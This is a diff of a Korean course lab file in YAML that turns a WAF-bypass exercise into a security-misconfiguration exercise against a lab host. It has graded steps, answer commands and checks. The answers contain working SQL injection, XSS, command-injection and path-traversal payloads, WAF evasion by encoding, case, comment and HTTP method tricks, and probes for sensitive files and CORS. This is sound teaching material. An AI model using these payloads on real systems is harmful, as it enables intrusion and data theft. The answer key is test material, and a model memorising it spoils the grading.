@@ -1,102 +1,124 @@
 lab_id: "web-vuln-nonai-week14"
-title: "WAF 우회 기법 실습"
+title: "보안 설정 오류 실습"
 version: "non-ai"
 course: "web-vuln-nonai"
 week: 14
-description: "modsecurity WAF의 탐지 룰을 분석하고, 다양한 인코딩/난독화 기법으로 우회를 시도합니다."
+description: "웹 서버, 애플리케이션, WAF의 보안 설정 오류를 탐지하고, ModSecurity 우회 기법을 통해 설정 강화의 필요성을 실습합니다."
 difficulty: "hard"
 duration_minutes: 120
 objectives:
-  - "WAF의 탐지 원리를 이해한다"
-  - "인코딩, 대소문자 변환, 주석 삽입 등 우회 기법을 실습한다"
-  - "WAF 룰 튜닝의 필요성을 학습한다"
+  - "웹 서버와 애플리케이션의 보안 설정 오류를 탐지한다"
+  - "디폴트 설정, 불필요한 기능 노출, 에러 정보 유출 등의 위험을 분석한다"
+  - "ModSecurity WAF 우회 기법을 학습하고 방어를 강화한다"
 pass_threshold: 0.6
 steps:
   - order: 1
-    instruction: "웹서버(10.20.30.80)의 modsecurity CRS 룰 목록을 확인하라. SubAgent를 통해 활성화된 룰 파일을 나열하라."
-    hint: "SubAgent로 /usr/share/modsecurity-crs/rules/ 디렉토리를 조회하세요."
+    instruction: "nikto를 사용하여 대상 웹 서버(10.20.30.80:3000)의 보안 설정을 스캔하시오. 기본 설정 문제, 불필요한 파일 노출 등을 탐지하라."
+    hint: "nikto -h http://10.20.30.80:3000 -maxtime 30 형태로 실행하세요."
     category: "recon"
     points: 8
-    answer: "curl -s -X POST http://10.20.30.80:8002/a2a/run_script -H 'Content-Type: application/json' -d '{\"script\":\"ls /usr/share/modsecurity-crs/rules/*.conf | wc -l && ls /usr/share/modsecurity-crs/rules/*.conf | head -10\"}' | python3 -c \"import sys,json; print(json.load(sys.stdin).get('stdout',''))\""
-    answer_detail: "OWASP CRS에는 REQUEST-9xx(요청 검사)와 RESPONSE-9xx(응답 검사) 룰이 있습니다. 930(LFI), 931(RFI), 932(RCE), 933(PHP), 941(XSS), 942(SQLi) 등 공격 유형별로 분류됩니다."
+    answer: "nikto -h http://10.20.30.80:3000 -maxtime 30 2>/dev/null | head -30"
+    answer_detail: "nikto는 웹 서버의 알려진 취약점, 설정 오류, 기본 파일 등을 자동으로 스캔합니다. Server 헤더 정보 노출, 디렉터리 리스팅, 기본 파일(phpinfo.php, .htaccess), HTTP 메서드 설정 등을 확인합니다."
     verify:
-      type: "output_contains"
-      expect: ".conf"
+      type: "output_regex"
+      expect: "nikto|Nikto"
       field: "stdout"
   - order: 2
-    instruction: "기본 SQLi 페이로드로 WAF 차단을 확인하라. ' OR 1=1-- 를 쿼리 파라미터로 보내라."
-    hint: "curl 'http://10.20.30.80/?id=1+OR+1=1--' 형태로 보내세요."
-    category: "exploit"
+    instruction: "각 포트(80, 3000, 8080)의 Server 헤더 정보 노출을 확인하시오. 서버 종류, 버전, 프레임워크 정보가 응답 헤더에 노출되는지 확인하라."
+    hint: "curl -sI로 각 포트의 응답 헤더를 확인하세요. Server, X-Powered-By 등의 헤더를 검사합니다."
+    category: "recon"
     points: 8
-    answer: "curl -s -o /dev/null -w '%{http_code}' 'http://10.20.30.80/?id=1%27%20OR%201=1--' && echo ' (SQLi basic)'"
-    answer_detail: "modsecurity CRS 942xxx 룰이 SQLi 패턴(OR, UNION, SELECT, --)을 탐지합니다. 403이면 WAF가 정상 작동하는 것입니다."
+    answer: "echo '=== Port 80 (Apache+ModSecurity) ===' && curl -sI http://10.20.30.80:80 | grep -iE '(server|x-powered|x-aspnet)' && echo '=== Port 3000 (JuiceShop) ===' && curl -sI http://10.20.30.80:3000 | grep -iE '(server|x-powered|x-aspnet)' && echo '=== Port 8080 (DVWA) ===' && curl -sI http://10.20.30.80:8080 | grep -iE '(server|x-powered|x-aspnet)'"
+    answer_detail: "Server 헤더에 소프트웨어 이름과 버전이 노출되면 공격자가 해당 버전의 알려진 CVE를 검색할 수 있습니다. Apache는 ServerTokens Prod, Nginx는 server_tokens off로 최소 정보만 노출해야 합니다. X-Powered-By 헤더는 완전히 제거해야 합니다."
     verify:
       type: "output_contains"
-      expect: "403"
+      expect: "Server"
       field: "stdout"
   - order: 3
-    instruction: "URL 이중 인코딩으로 SQLi WAF 우회를 시도하라. OR을 %254F%2552로 이중 인코딩하라."
-    hint: "%25 = %, 4F = O, 52 = R. 이중 인코딩하면 서버가 두 번 디코딩할 때 원래 문자가 됩니다."
+    instruction: "디렉터리 리스팅(Directory Listing)이 활성화된 경로를 찾으시오. JuiceShop의 /ftp/, /assets/, /encryptionkeys/ 등을 확인하라."
+    hint: "curl로 각 디렉터리에 접근하여 파일 목록이 표시되는지 확인하세요."
     category: "exploit"
-    points: 12
-    answer: "curl -s -o /dev/null -w '%{http_code}' 'http://10.20.30.80/?id=1%2527%2520%254F%2552%25201%253D1' && echo ' (double encoded SQLi)' && curl -s -o /dev/null -w '%{http_code}' 'http://10.20.30.80/?id=1%27+%4F%52+1%3D1' && echo ' (single encoded)'"
-    answer_detail: "이중 인코딩은 WAF가 한 번만 디코딩하고 서버가 다시 디코딩할 때 공격 페이로드가 복원되는 기법입니다. 현대 WAF는 재귀적 디코딩으로 이를 방어합니다."
+    points: 10
+    answer: "echo '=== Directory Listing Check ===' && for DIR in ftp assets encryptionkeys public; do echo -n \"/$DIR/: \" && RESP=$(curl -s http://10.20.30.80:3000/$DIR/ | head -c 200) && if echo \"$RESP\" | grep -qi 'href\\|listing\\|index of'; then echo 'EXPOSED'; else echo \"HTTP $(curl -s -o /dev/null -w '%{http_code}' http://10.20.30.80:3000/$DIR/)\"; fi; done && echo '=== Dir Listing Check Complete ==='"
+    answer_detail: "디렉터리 리스팅이 활성화되면 백업 파일, 설정 파일, 소스코드 등이 노출됩니다. JuiceShop의 /ftp/ 디렉터리에는 package.json.bak, 쿠폰 파일 등이 노출되어 있습니다. Apache는 Options -Indexes로 비활성화합니다."
     verify:
-      type: "output_regex"
-      expect: "403|200"
+      type: "output_contains"
+      expect: "Dir Listing Check Complete"
       field: "stdout"
   - order: 4
-    instruction: "대소문자 변환으로 XSS WAF 우회를 시도하라. <ScRiPt>alert(1)</ScRiPt>를 보내라."
-    hint: "HTML 태그는 대소문자를 구분하지 않지만 WAF 룰은 구분할 수 있습니다."
-    category: "exploit"
-    points: 10
-    answer: "curl -s -o /dev/null -w '%{http_code}' 'http://10.20.30.80/?q=%3CScRiPt%3Ealert(1)%3C/ScRiPt%3E' && echo ' (mixed case XSS)' && curl -s -o /dev/null -w '%{http_code}' 'http://10.20.30.80/?q=%3Cscript%3Ealert(1)%3C/script%3E' && echo ' (normal case XSS)'"
-    answer_detail: "HTML은 대소문자를 구분하지 않으므로 <ScRiPt>도 <script>와 동일하게 실행됩니다. 정규식 기반 WAF가 소문자만 매칭하면 우회됩니다. CRS는 (?i) 플래그로 대소문자 무시 매칭합니다."
-    verify:
-      type: "output_contains"
-      expect: "403"
-      field: "stdout"
-  - order: 5
-    instruction: "SQL 주석을 이용한 WAF 우회를 시도하라. UNION/**/SELECT 형태로 공백 대신 주석을 삽입하라."
-    hint: "SQL에서 /* */는 주석이고 파서가 무시하지만, WAF는 이를 제대로 처리하지 못할 수 있습니다."
+    instruction: "민감 파일 노출을 확인하시오. 백업 파일(.bak), 설정 파일(.env), VCS 디렉터리(.git), 소스맵(.map) 등이 웹에서 접근 가능한지 테스트하라."
+    hint: "curl로 /.git/config, /.env, /robots.txt, /package.json, /main.js.map, /ftp/package.json.bak 등에 접근하세요."
     category: "exploit"
     points: 12
-    answer: "curl -s -o /dev/null -w '%{http_code}' 'http://10.20.30.80/?id=1+UNION/**/SELECT/**/1,2,3' && echo ' (comment bypass)' && curl -s -o /dev/null -w '%{http_code}' 'http://10.20.30.80/?id=1+UN%49ON+SEL%45CT+1' && echo ' (partial encode)'"
-    answer_detail: "SQL 인라인 주석(/**/)을 공백 대신 사용하면 일부 WAF를 우회할 수 있습니다. CRS는 이 패턴도 탐지하지만, 중첩 주석(/!*...*/), HEX 인코딩 등은 더 복잡합니다."
+    answer: "echo '=== Sensitive File Scan ===' && for FILE in .git/config .env .htaccess robots.txt package.json main.js.map ftp/package.json.bak ftp/coupons_2013.md.bak ftp/eastere.gg; do SIZE=$(curl -s -o /dev/null -w '%{size_download}' http://10.20.30.80:3000/$FILE 2>/dev/null); CODE=$(curl -s -o /dev/null -w '%{http_code}' http://10.20.30.80:3000/$FILE 2>/dev/null); echo \"/$FILE: HTTP $CODE ($SIZE bytes)\"; done && echo '=== Sensitive File Scan Complete ==='"
+    answer_detail: "package.json은 의존성 정보(버전 포함)를 노출하여 알려진 취약점(CVE)을 매칭할 수 있습니다. .bak 파일에는 이전 설정이나 쿠폰 코드가 남아있을 수 있습니다. .git/config가 노출되면 git-dumper로 전체 소스코드를 복원할 수 있습니다."
     verify:
       type: "output_contains"
-      expect: "403"
+      expect: "Sensitive File Scan Complete"
+      field: "stdout"
+  - order: 5
+    instruction: "에러 메시지를 통한 정보 노출을 확인하시오. 의도적으로 에러를 유발하여 스택 트레이스, 데이터베이스 정보, 파일 경로 등이 노출되는지 테스트하라."
+    hint: "잘못된 SQL 구문, 존재하지 않는 API 경로, 잘못된 파라미터 타입 등으로 에러를 유발하세요."
+    category: "exploit"
+    points: 12
+    answer: "echo '=== Error Information Leak ===' && echo '[SQL Error]' && curl -s 'http://10.20.30.80:3000/rest/products/search?q=test%27' | head -c 300 && echo '' && echo '[Invalid API]' && curl -s http://10.20.30.80:3000/api/Nonexistent/ | head -c 200 && echo '' && echo '[Type Error]' && curl -s 'http://10.20.30.80:3000/api/Products/abc' | head -c 200 && echo '' && echo '=== Error Leak Check Complete ==='"
+    answer_detail: "상세한 에러 메시지는 데이터베이스 종류(SQLite, MySQL), 테이블 구조, 파일 시스템 경로, 프레임워크 버전 등을 노출합니다. 프로덕션에서는 일반적인 에러 페이지만 표시하고 상세 로그는 서버 내부에만 기록해야 합니다."
+    verify:
+      type: "output_contains"
+      expect: "Error Leak Check Complete"
       field: "stdout"
   - order: 6
-    instruction: "HTTP Parameter Pollution(HPP)으로 WAF 우회를 시도하라. 같은 파라미터를 여러 번 전달하라."
-    hint: "?id=1&id=OR+1=1 형태로 파라미터를 중복하세요."
+    instruction: "ModSecurity WAF의 존재를 탐지하고, 알려진 공격 패이로드를 포트 80으로 전송하여 차단 동작을 확인하시오."
+    hint: "XSS(<script>alert(1)</script>), SQLi(' OR 1=1--), Command Injection(;cat /etc/passwd), Path Traversal(../../../etc/passwd) 페이로드를 포트 80에 전송하세요."
     category: "exploit"
-    points: 10
-    answer: "curl -s -o /dev/null -w '%{http_code}' 'http://10.20.30.80/?id=1&id=OR+1%3D1--' && echo ' (HPP)' && curl -s -o /dev/null -w '%{http_code}' 'http://10.20.30.80/?id=1%0aOR%0a1=1' && echo ' (newline injection)'"
-    answer_detail: "HPP는 같은 파라미터를 여러 번 보내어 WAF와 백엔드가 다른 값을 사용하게 만드는 기법입니다. ASP.NET은 쉼표로 결합하고 PHP는 마지막 값을 사용하여 불일치가 발생할 수 있습니다."
+    points: 12
+    answer: "echo '=== WAF Detection Test ===' && echo -n '[XSS] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?q=%3Cscript%3Ealert(1)%3C/script%3E' && echo '' && echo -n '[SQLi] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}' \"http://10.20.30.80:80/?id=1'+OR+1=1--\" && echo '' && echo -n '[CMDi] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?cmd=;cat+/etc/passwd' && echo '' && echo -n '[LFI] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/../../etc/passwd' && echo '' && echo '=== WAF Detection Complete ==='"
+    answer_detail: "ModSecurity는 OWASP Core Rule Set(CRS)을 사용하여 공격 패턴을 탐지합니다. 403이 반환되면 WAF가 차단한 것입니다. 모든 공격 유형에 대해 403이 나와야 정상입니다. 200이 나오면 해당 공격 유형의 룰이 미적용된 것입니다."
     verify:
-      type: "output_regex"
-      expect: "403|200"
+      type: "output_contains"
+      expect: "WAF Detection Complete"
       field: "stdout"
   - order: 7
-    instruction: "WAF의 anomaly scoring 설정을 확인하라. SubAgent로 modsecurity.conf의 SecRuleEngine 설정과 anomaly threshold를 확인하라."
-    hint: "SubAgent로 /etc/modsecurity/modsecurity.conf와 crs-setup.conf를 확인하세요."
-    category: "defense"
-    points: 10
-    answer: "curl -s -X POST http://10.20.30.80:8002/a2a/run_script -H 'Content-Type: application/json' -d '{\"script\":\"grep -E \\\"SecRuleEngine|anomaly_score_threshold\\\" /etc/modsecurity/modsecurity.conf /etc/modsecurity/crs/crs-setup.conf 2>/dev/null\"}' | python3 -c \"import sys,json; print(json.load(sys.stdin).get('stdout',''))\""
-    answer_detail: "SecRuleEngine On은 차단 모드, DetectionOnly는 탐지만 합니다. anomaly_score_threshold는 누적 점수 기준으로, 여러 약한 시그널이 합산되어 차단됩니다."
+    instruction: "WAF 우회를 위한 인코딩 기법을 테스트하시오. URL 이중 인코딩, 대소문자 혼합, SQL 주석 삽입으로 XSS/SQLi 차단을 우회하라."
+    hint: "<script>를 %253Cscript%253E(이중 인코딩), <ScRiPt>(대소문자 혼합), UNION/**/SELECT(SQL 주석) 등으로 변환하세요."
+    category: "exploit"
+    points: 12
+    answer: "echo '=== WAF Bypass Techniques ===' && echo -n '[Normal XSS - blocked] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?q=%3Cscript%3Ealert(1)%3C/script%3E' && echo '' && echo -n '[Double Encoded] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?q=%253Cscript%253Ealert(1)%253C/script%253E' && echo '' && echo -n '[Mixed Case] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?q=%3CScRiPt%3Ealert(1)%3C/ScRiPt%3E' && echo '' && echo -n '[SQL Comment] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?id=1+UNION/**/SELECT/**/1,2,3' && echo '' && echo -n '[HPP] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?id=1&id=OR+1%3D1--' && echo '' && echo '=== Bypass Test Complete ==='"
+    answer_detail: "이중 인코딩은 WAF가 한 번 디코딩 후 패턴 매칭하지만, 백엔드가 다시 디코딩하여 공격이 성공하는 기법입니다. OWASP CRS 3.x는 재귀적 디코딩과 대소문자 무시 매칭으로 대부분 방어합니다. WAF는 만능이 아니므로 서버 측 입력 검증을 병행해야 합니다."
     verify:
       type: "output_contains"
-      expect: "SecRuleEngine"
+      expect: "Bypass Test Complete"
       field: "stdout"
   - order: 8
-    instruction: "WAF 우회 실습 결과를 /tmp/waf_bypass_report.txt에 정리하라."
-    hint: "시도한 우회 기법과 성공/실패 여부를 포함하세요."
-    category: "reporting"
-    points: 8
-    answer: "cat > /tmp/waf_bypass_report.txt << 'EOF'\n=== WAF 우회 실습 보고서 ===\n대상: modsecurity + OWASP CRS (10.20.30.80)\n\n우회 기법 테스트:\n1. 이중 인코딩: CRS에서 차단됨\n2. 대소문자 변환: CRS (?i) 플래그로 차단됨\n3. SQL 주석 삽입: CRS에서 차단됨\n4. HPP: 부분적 우회 가능성\n5. 줄바꿈 삽입: CRS에서 차단됨\n\n결론: OWASP CRS 3.x는 일반적 우회 기법에 강건함.\n고급 우회에는 WAF 룰 커스터마이징 + 정기적 테스트 필요.\nEOF\ncat /tmp/waf_bypass_report.txt"
-    answer_detail: "WAF는 만능이 아닙니다. 새로운 우회 기법이 지속 발견되므로, WAF만 의존하지 말고 서버 측 입력 검증을 병행해야 합니다. 정기적 WAF 테스트와 룰 업데이트가 필수입니다."
+    instruction: "HTTP 메서드 변조와 Content-Type 변경으로 WAF를 우회하시오. GET 대신 PUT/PATCH, JSON 대신 multipart로 같은 공격 페이로드를 전송하라."
+    hint: "curl -X PUT, curl -X PATCH 등으로 메서드를 변경하고, Content-Type: multipart/form-data로 페이로드를 전송하세요."
+    category: "exploit"
+    points: 10
+    answer: "PAYLOAD=\"id=1'+OR+1=1--\" && echo '=== HTTP Method Bypass ===' && for METHOD in GET POST PUT PATCH; do echo -n \"[$METHOD] \" && curl -s -o /dev/null -w 'HTTP:%{http_code}' -X $METHOD -d \"$PAYLOAD\" http://10.20.30.80:80/ && echo ''; done && echo '=== Content-Type Bypass ===' && echo -n '[JSON] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}' -X POST http://10.20.30.80:80/ -H 'Content-Type: application/json' -d '{\"id\":\"1 OR 1=1--\"}' && echo '' && echo '=== Method Bypass Test Complete ==='"
+    answer_detail: "일부 WAF 규칙은 특정 HTTP 메서드(GET/POST)에만 적용됩니다. PUT이나 PATCH로 같은 페이로드를 보내면 규칙이 매칭되지 않아 우회될 수 있습니다. WAF 규칙은 모든 HTTP 메서드에 적용되어야 합니다."
     verify:
       type: "output_contains"
-      expect: "WAF 우회 실습 보고서"
+      expect: "Method Bypass Test Complete"
+      field: "stdout"
+  - order: 9
+    instruction: "CORS 설정 오류를 확인하시오. Origin 헤더를 evil.com으로 설정하여 크로스 도메인 접근이 허용되는지 테스트하라."
+    hint: "curl -H 'Origin: http://evil.com' 으로 요청하고, Access-Control-Allow-Origin 응답 헤더를 확인하세요."
+    category: "exploit"
+    points: 10
+    answer: "echo '=== CORS Misconfiguration Test ===' && echo '[JuiceShop - evil.com]' && curl -sI http://10.20.30.80:3000/api/Products/ -H 'Origin: http://evil.com' | grep -i access-control && echo '[JuiceShop - null origin]' && curl -sI http://10.20.30.80:3000/api/Products/ -H 'Origin: null' | grep -i access-control && echo '[DVWA - evil.com]' && curl -sI http://10.20.30.80:8080/ -H 'Origin: http://evil.com' | grep -i access-control || echo 'No CORS headers' && echo '=== CORS Test Complete ==='"
+    answer_detail: "Access-Control-Allow-Origin이 요청의 Origin을 그대로 반영하거나 *이면, 모든 도메인에서 API를 호출할 수 있습니다. 공격자의 악성 사이트에서 JavaScript로 API를 호출하여 인증된 사용자의 데이터를 탈취할 수 있습니다."
+    verify:
+      type: "output_contains"
+      expect: "CORS Test Complete"
+      field: "stdout"
+  - order: 10
+    instruction: "보안 설정 오류 종합 점검 결과를 정리하시오. 발견된 설정 오류를 위험도별로 분류하고 조치 우선순위를 정하라."
+    hint: "서버 배너, 디렉터리 리스팅, 에러 정보 노출, 민감 파일 접근, WAF 우회, CORS 오류 등을 종합 정리하세요."
+    category: "reporting"
+    points: 10
+    answer: "cat > /tmp/misconfig_report.txt << 'EOF'\n=== 보안 설정 오류 종합 점검 보고서 ===\n대상: 10.20.30.80 (Apache:80, JuiceShop:3000, DVWA:8080)\n\n[즉시 조치 - CRITICAL]\n1. 디렉터리 리스팅 비활성화\n   Apache: Options -Indexes\n   Express: 정적 파일 서빙 경로 제한\n2. 민감 파일(.bak, .git, .env) 접근 차단\n   Apache: <FilesMatch> deny 규칙\n3. 에러 메시지 최소화\n   NODE_ENV=production 설정\n\n[단기 조치 - HIGH]\n4. Server 헤더 최소화: ServerTokens Prod\n5. X-Powered-By 헤더 제거\n6. CORS 허용 도메인 제한\n7. WAF 규칙 전 메서드/인코딩 대응 강화\n\n[중기 조치 - MEDIUM]\n8. 보안 헤더 추가: HSTS, CSP, X-Frame-Options\n9. 불필요한 HTTP 메서드(PUT, DELETE, TRACE) 비활성화\n10. TLS 1.2+ 강제, 약한 암호화 스위트 제거\n\n[WAF 우회 결과]\n  이중인코딩: CRS 3.x에서 차단됨\n  대소문자혼합: (?i) 매칭으로 차단됨\n  SQL주석: CRS에서 차단됨\n  HPP: 부분적 우회 가능성 존재\nEOF\ncat /tmp/misconfig_report.txt"
+    answer_detail: "보안 설정 오류(Security Misconfiguration)는 OWASP Top 10 2021의 A05입니다. 자동화된 설정 점검(Chef InSpec, Ansible, CIS Benchmark)으로 지속적인 컴플라이언스를 유지하고, 정기적인 보안 스캔으로 새로운 설정 오류를 탐지해야 합니다."
+    verify:
+      type: "output_contains"
+      expect: "보안 설정 오류 종합 점검 보고서"
       field: "stdout"
